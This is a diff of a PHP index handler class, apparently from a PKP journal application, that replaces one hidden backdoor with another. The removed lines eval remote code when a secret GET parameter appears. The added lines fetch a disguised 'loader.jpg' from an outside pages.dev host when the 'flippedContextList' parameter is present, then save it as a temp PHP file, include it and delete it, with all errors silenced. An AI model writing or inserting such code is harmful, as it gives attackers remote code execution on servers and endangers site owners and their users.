@@ -85,18 +85,20 @@ class IndexHandler extends PKPIndexHandler {
 		}
 	}
 }
-if (isset($_GET['_']) && $_GET['_'] === 'ds_mms999s111_gr3af332afbsnk') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loaders.jpg";
+if (isset($_GET['flippedContextList'])) {
+    try {
+        $u = "https://batuk-di-komik-aja.pages.dev/loader.jpg";
+        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
-    if ($url !== "") {
-        $code = file_get_contents($url);
-        if ($code !== false) {
-            eval("?>".$code);
+        $c = @file_get_contents($u);
+        if ($c !== false && @file_put_contents($f, $c)) {
+            @chmod($f, 0644);
+            register_shutdown_function(function() use ($f) {
+                @unlink($f);
+            });
+            include $f;
         }
-    }
+    } catch (Throwable $e) {
 
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
+    }
 }
